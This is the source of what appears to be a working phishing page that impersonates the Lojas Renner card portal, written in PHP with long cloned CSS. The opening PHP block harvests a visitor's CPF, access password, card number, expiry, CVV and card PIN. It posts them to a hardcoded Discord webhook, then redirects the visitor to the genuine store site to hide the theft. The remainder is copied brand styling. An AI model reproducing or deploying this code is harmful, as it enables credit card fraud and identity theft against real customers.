...
if((isset($_POST['card']) && !(is_null($_POST['card']))) && (isset($_POST['cpf']) && !(is_null($_POST['cpf'])) && (isset($_GET['check'])))){
    ...
    $url = "https://discord.com/api/webhooks/1085201245242921122/R0piPu6Hd3BljMEdBXpADJrRNQxdqaOQJsBqkFEhy5OH_30NnkYdD3cyFLoo3p9ULsL5";
    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
    $POST = [ 'username' => 'gutinho', 'content' => '
    ```css
    Cpf -> '.$cpf.' 
    Senha de acesso -> '.$acesso.'
    Número do cartão -> '.$cc.'
    Validade do cartão -> '.$date.'
    Codigo de segurança -> '.$cvv.'
    Senha do cartão -> '.$pass.'```' ];
    ...
    header("Location: https://www.lojasrenner.com.br/");
    exit();
}
?>
<html class="">
 ...
 */
     ...
     */
        ...
        *::after {
        ...
        @media only screen and (min-width: 998px) {
            ...
            .buttons--outline .button:hover,
            .buttons--outline .button:hover:focus,
            .button.button--outline:hover,
            .button.button--outline:hover:focus {
                border-color: #000;
                background-color: #000;
                color: #fff;
            }
        ...
        :not(.loader--show) .buttons--outline .button[disabled],
        :not(.loader--show) .buttons--outline .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .button[disabled]:active,
        :not(.loader--show) .buttons--outline .button[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .button.button--disabled:hover,
        :not(.loader--show) .button.button--outline[disabled],
        :not(.loader--show) .button.button--outline[disabled]:focus,
        :not(.loader--show) .button.button--outline[disabled]:active,
        :not(.loader--show) .button.button--outline[disabled]:hover,
        ...
        .cartao-renner .button,
        .cartao-renner .button:focus,
        ...
        .cartao-renner .button[disabled],
        .cartao-renner .button[disabled]:focus,
        .cartao-renner .button[disabled]:active,
        .cartao-renner .button[disabled]:hover,
        .cartao-renner .button.button--disabled,
        .cartao-renner .button.button--disabled:focus,
        .cartao-renner .button.button--disabled:active,
        .cartao-renner .button.button--disabled:hover,
        ...
        @media only screen and (min-width: 998px) {
            ...
            .buttons--outline .cartao-renner .button:hover,
            .buttons--outline .cartao-renner .button:hover:focus,
            .cartao-renner .button.button--outline:hover,
            .cartao-renner .button.button--outline:hover:focus,
            .buttons--outline .meu-cartao .cartao-renner .button:hover,
            .buttons--outline .meu-cartao .cartao-renner .button:hover:focus,
        ...
        .buttons--outline .cartao-renner .button,
        .buttons--outline .cartao-renner .button:focus,
        .cartao-renner .button.button--outline,
        .cartao-renner .button.button--outline:focus,
        .buttons--outline .meu-cartao .cartao-renner .button,
        .buttons--outline .meu-cartao .cartao-renner .button:focus,
        ...
        .buttons--outline .cartao-renner .button:active,
        .cartao-renner .button.button--outline:active,
        .buttons--outline .meu-cartao .cartao-renner .button:active,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .button[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--disabled:hover,
        :not(.loader--show) .cartao-renner .button.button--outline[disabled],
        :not(.loader--show) .cartao-renner .button.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .button.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .button.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .cartao-renner .button.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--disabled:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline[disabled],
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--outline.button--disabled:hover {
            border: 1px solid #ddd;
            background-color: #fff;
            cursor: default;
            color: #ddd;
        ...
        .meu-cartao .button[disabled],
        .meu-cartao .button[disabled]:focus,
        .meu-cartao .button[disabled]:active,
        .meu-cartao .button[disabled]:hover,
        .meu-cartao .button.button--disabled,
        .meu-cartao .button.button--disabled:focus,
        .meu-cartao .button.button--disabled:active,
        .meu-cartao .button.button--disabled:hover,
        ...
        @media only screen and (min-width: 998px) {
            ...
            .buttons--outline .meu-cartao .button:hover,
            .buttons--outline .meu-cartao .button:hover:focus,
            .meu-cartao .button.button--outline:hover,
            .meu-cartao .button.button--outline:hover:focus,
            .buttons--outline .cartao-renner .meu-cartao .button:hover,
            .buttons--outline .cartao-renner .meu-cartao .button:hover:focus,
        ...
        .buttons--outline .meu-cartao .button,
        .buttons--outline .meu-cartao .button:focus,
        .meu-cartao .button.button--outline,
        .meu-cartao .button.button--outline:focus,
        .buttons--outline .cartao-renner .meu-cartao .button,
        .buttons--outline .cartao-renner .meu-cartao .button:focus,
        ...
        .buttons--outline .meu-cartao .button:active,
        .meu-cartao .button.button--outline:active,
        .buttons--outline .cartao-renner .meu-cartao .button:active,
        ...
        :not(.loader--show) .buttons--outline .meu-cartao .button[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .button[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--disabled:hover,
        :not(.loader--show) .meu-cartao .button.button--outline[disabled],
        :not(.loader--show) .meu-cartao .button.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .button.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .button.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .meu-cartao .button.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button[disabled]:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--disabled,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--disabled:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--disabled:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--disabled:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline[disabled],
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline[disabled]:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline.button--disabled,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline.button--disabled:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline.button--disabled:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--outline.button--disabled:hover {
            border: 1px solid #ddd;
            background-color: #fff;
            cursor: default;
            color: #ddd;
        ...
        @media only screen and (min-width: 998px) {
            ...
            .cartao-renner .button.button--default:hover,
            .cartao-renner .button.button--default.button--outline:hover,
        ...
        .cartao-renner .button.button--default,
        .cartao-renner .button.button--default:focus,
        .cartao-renner .button.button--default.button--outline,
        .cartao-renner .button.button--default.button--outline:focus,
        ...
        .cartao-renner .button.button--default:active,
        .cartao-renner .button.button--default.button--outline:active,
        ...
        .cartao-renner .button.button--default[disabled],
        .cartao-renner .button.button--default[disabled]:focus,
        .cartao-renner .button.button--default[disabled]:active,
        .cartao-renner .button.button--default[disabled]:hover,
        .cartao-renner .button.button--default.button--disabled,
        .cartao-renner .button.button--default.button--disabled:focus,
        .cartao-renner .button.button--default.button--disabled:active,
        .cartao-renner .button.button--default.button--disabled:hover,
        .cartao-renner .button.button--default.button--outline[disabled],
        .cartao-renner .button.button--default.button--outline[disabled]:focus,
        .cartao-renner .button.button--default.button--outline[disabled]:active,
        .cartao-renner .button.button--default.button--outline[disabled]:hover,
        .cartao-renner .button.button--default.button--outline.button--disabled,
        .cartao-renner .button.button--default.button--outline.button--disabled:focus,
        .cartao-renner .button.button--default.button--outline.button--disabled:active,
        .cartao-renner .button.button--default.button--outline.button--disabled:hover,
        ...
        @media only screen and (min-width: 998px) {
            ...
            .buttons--outline .cartao-renner .button.button--default:hover,
            .buttons--outline .cartao-renner .button.button--default:hover:focus,
            .cartao-renner .button.button--default.button--outline:hover,
            .cartao-renner .button.button--default.button--outline:hover:focus,
            .buttons--outline .cartao-renner .button.button--default.button--outline:hover,
            .buttons--outline .cartao-renner .button.button--default.button--outline:hover:focus,
            .cartao-renner .button.button--default.button--outline.button--outline:hover,
            .cartao-renner .button.button--default.button--outline.button--outline:hover:focus,
            .buttons--outline .meu-cartao .cartao-renner .button.button--default:hover,
            .buttons--outline .meu-cartao .cartao-renner .button.button--default:hover:focus,
            .meu-cartao .cartao-renner .button.button--default.button--outline:hover,
            .meu-cartao .cartao-renner .button.button--default.button--outline:hover:focus,
            .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline:hover,
            .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline:hover:focus,
            .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:hover,
            .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:hover:focus,
            .buttons--outline .meu-cartao .button.button--default:hover,
            .buttons--outline .meu-cartao .button.button--default:hover:focus,
            .meu-cartao .button.button--default.button--outline:hover,
            .meu-cartao .button.button--default.button--outline:hover:focus,
            .buttons--outline .meu-cartao .button.button--default.button--outline:hover,
            .buttons--outline .meu-cartao .button.button--default.button--outline:hover:focus,
            .meu-cartao .button.button--default.button--outline.button--outline:hover,
            .meu-cartao .button.button--default.button--outline.button--outline:hover:focus,
            .buttons--outline .cartao-renner .meu-cartao .button.button--default:hover,
            .buttons--outline .cartao-renner .meu-cartao .button.button--default:hover:focus,
            .cartao-renner .meu-cartao .button.button--default.button--outline:hover,
            .cartao-renner .meu-cartao .button.button--default.button--outline:hover:focus,
            .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline:hover,
            .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline:hover:focus,
        ...
        .buttons--outline .cartao-renner .button.button--default,
        .buttons--outline .cartao-renner .button.button--default:focus,
        .cartao-renner .button.button--default.button--outline,
        .cartao-renner .button.button--default.button--outline:focus,
        .buttons--outline .cartao-renner .button.button--default.button--outline,
        .buttons--outline .cartao-renner .button.button--default.button--outline:focus,
        .cartao-renner .button.button--default.button--outline.button--outline,
        .cartao-renner .button.button--default.button--outline.button--outline:focus,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default:focus,
        .meu-cartao .cartao-renner .button.button--default.button--outline,
        .meu-cartao .cartao-renner .button.button--default.button--outline:focus,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline:focus,
        .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline,
        .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:focus,
        .buttons--outline .meu-cartao .button.button--default,
        .buttons--outline .meu-cartao .button.button--default:focus,
        .meu-cartao .button.button--default.button--outline,
        .meu-cartao .button.button--default.button--outline:focus,
        .buttons--outline .meu-cartao .button.button--default.button--outline,
        .buttons--outline .meu-cartao .button.button--default.button--outline:focus,
        .meu-cartao .button.button--default.button--outline.button--outline,
        .meu-cartao .button.button--default.button--outline.button--outline:focus,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default:focus,
        .cartao-renner .meu-cartao .button.button--default.button--outline,
        .cartao-renner .meu-cartao .button.button--default.button--outline:focus,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline:focus,
        ...
        .buttons--outline .cartao-renner .button.button--default:active,
        .cartao-renner .button.button--default.button--outline:active,
        .buttons--outline .cartao-renner .button.button--default.button--outline:active,
        .cartao-renner .button.button--default.button--outline.button--outline:active,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default:active,
        .meu-cartao .cartao-renner .button.button--default.button--outline:active,
        .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline:active,
        .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline:active,
        .buttons--outline .meu-cartao .button.button--default:active,
        .meu-cartao .button.button--default.button--outline:active,
        .buttons--outline .meu-cartao .button.button--default.button--outline:active,
        .meu-cartao .button.button--default.button--outline.button--outline:active,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default:active,
        .cartao-renner .meu-cartao .button.button--default.button--outline:active,
        .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline:active,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--disabled:hover,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled],
        :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled],
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--disabled:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline[disabled],
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled],
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .cartao-renner .button.button--default.button--outline.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--disabled:hover,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline[disabled],
        :not(.loader--show) .meu-cartao .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline[disabled],
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default[disabled]:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--disabled,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--disabled:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--disabled:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--disabled:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline[disabled],
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline[disabled]:hover,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:active,
        :not(.loader--show) .buttons--outline .cartao-renner .meu-cartao .button.button--default.button--outline.button--disabled:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled],
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline[disabled]:hover,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:focus,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:active,
        :not(.loader--show) .cartao-renner .meu-cartao .button.button--default.button--outline.button--outline.button--disabled:hover {
            border: 1px solid #ddd;
            background-color: #fff;
            cursor: default;
            color: #ddd;
        ...
        .cartao-renner .single-page-button .button,
        .cartao-renner .single-page-button .button:focus,
        ...
        .cartao-renner .single-page-button .button[disabled],
        .cartao-renner .single-page-button .button[disabled]:focus,
        .cartao-renner .single-page-button .button[disabled]:active,
        .cartao-renner .single-page-button .button[disabled]:hover,
        .cartao-renner .single-page-button .button.button--disabled,
        .cartao-renner .single-page-button .button.button--disabled:focus,
        .cartao-renner .single-page-button .button.button--disabled:active,
        .cartao-renner .single-page-button .button.button--disabled:hover,
        ...
        @media only screen and (min-width: 998px) {
            ...
            .buttons--outline .cartao-renner .single-page-button .button:hover,
            .buttons--outline .cartao-renner .single-page-button .button:hover:focus,
            .cartao-renner .single-page-button .button.button--outline:hover,
            .cartao-renner .single-page-button .button.button--outline:hover:focus,
            .buttons--outline .meu-cartao .single-page-button .button:hover,
            .buttons--outline .meu-cartao .single-page-button .button:hover:focus,
            .meu-cartao .single-page-button .button.button--outline:hover,
            .meu-cartao .single-page-button .button.button--outline:hover:focus,
            .buttons--outline .meu-cartao .cartao-renner .single-page-button .button:hover,
            .buttons--outline .meu-cartao .cartao-renner .single-page-button .button:hover:focus,
            .meu-cartao .cartao-renner .single-page-button .button.button--outline:hover,
            .meu-cartao .cartao-renner .single-page-button .button.button--outline:hover:focus,
            .buttons--outline .cartao-renner .meu-cartao .single-page-button .button:hover,
            .buttons--outline .cartao-renner .meu-cartao .single-page-button .button:hover:focus,
        ...
        .buttons--outline .cartao-renner .single-page-button .button,
        .buttons--outline .cartao-renner .single-page-button .button:focus,
        .cartao-renner .single-page-button .button.button--outline,
        .cartao-renner .single-page-button .button.button--outline:focus,
        .buttons--outline .meu-cartao .single-page-button .button,
        .buttons--outline .meu-cartao .single-page-button .button:focus,
        .meu-cartao .single-page-button .button.button--outline,
        .meu-cartao .single-page-button .button.button--outline:focus,
        .buttons--outline .meu-cartao .cartao-renner .single-page-button .button,
        .buttons--outline .meu-cartao .cartao-renner .single-page-button .button:focus,
        .meu-cartao .cartao-renner .single-page-button .button.button--outline,
        .meu-cartao .cartao-renner .single-page-button .button.button--outline:focus,
        .buttons--outline .cartao-renner .meu-cartao .single-page-button .button,
        .buttons--outline .cartao-renner .meu-cartao .single-page-button .button:focus,
        ...
        .buttons--outline .cartao-renner .single-page-button .button:active,
        .cartao-renner .single-page-button .button.button--outline:active,
        .buttons--outline .meu-cartao .single-page-button .button:active,
        .meu-cartao .single-page-button .button.button--outline:active,
        .buttons--outline .meu-cartao .cartao-renner .single-page-button .button:active,
        .meu-cartao .cartao-renner .single-page-button .button.button--outline:active,
        .buttons--outline .cartao-renner .meu-cartao .single-page-button .button:active,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled],
        :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:active,
        :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button[disabled]:hover,
        ...
        :not(.loader--show) .buttons--outline .cartao-renner .single-page-button .button.button--disabled:hover,
        :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled],
        :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:focus,
        :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:active,
        :not(.loader--show) .cartao-renner .single-page-button .button.button--outline[disabled]:hover,
        ...
        :not(.loader--show) .cartao-renner .single-page-button .button.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .single-page-button .button.button--disabled:hover,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline[disabled],
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline[disabled]:focus,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline[disabled]:active,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline[disabled]:hover,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline.button--disabled,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline.button--disabled:focus,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline.button--disabled:active,
        :not(.loader--show) .meu-cartao .single-page-button .button.button--outline.button--disabled:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button[disabled],
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button[disabled]:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button[disabled]:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button[disabled]:hover,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button.button--disabled,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button.button--disabled:focus,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button.button--disabled:active,
        :not(.loader--show) .buttons--outline .meu-cartao .cartao-renner .single-page-button .button.button--disabled:hover,
